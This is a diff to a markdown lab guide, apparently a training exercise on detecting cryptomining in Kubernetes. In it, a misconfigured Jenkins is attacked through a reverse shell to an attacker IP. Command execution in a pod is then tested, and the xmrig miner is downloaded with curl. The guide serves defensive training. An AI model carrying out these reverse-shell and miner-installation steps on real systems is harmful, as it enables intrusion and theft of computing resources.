@@ -309,7 +309,7 @@ In this training, a misconfigured instance of *Jenkins* is being used as the ent
 
 - 1. Launch a reverse shell
 
-     Use the terminal in the left to launch the attack. From here, retrieve the IP of the machine. It will be required to connect to the [*reserve shell*](https://play.instruqt.com/embed/sysdig/tracks/falco-prometheus-cryptomining-detect/challenges/exploit-the-vuln/assignment) running in the attacker machine:
+     Retrieve the IP of the machine. It will be required to connect to the [*reserve shell*](https://play.instruqt.com/embed/sysdig/tracks/falco-prometheus-cryptomining-detect/challenges/exploit-the-vuln/assignment) running in the attacker machine:
 
   ```shell
   ATTACKER_IP=$(ip route get 1 |awk '{print $7}')
@@ -335,14 +335,14 @@ In this training, a misconfigured instance of *Jenkins* is being used as the ent
 
   ###### Step3: Install a cryptominer
 
-  1. Test that if we can execute any command and access the whole file system in the pod.
+1. Test that if we can execute any command and access the whole file system in the pod.
 
 ```shell
 apt remove curl -y
 apt install curl -y
 ```
 
-	2. Download, install and run crypto miner.  (For now, the lab enviroment is down and safety concerns, we didn't actually run the attack, we demostrate the way to detect and defense in the following steps).
+	2. Download, install and run crypto miner.  (For now, the lab enviroment is down and for safety concerns, we didn't actually run the attack, we demostrate the way to detect and defense in the following steps).
 
 ```shell
 curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
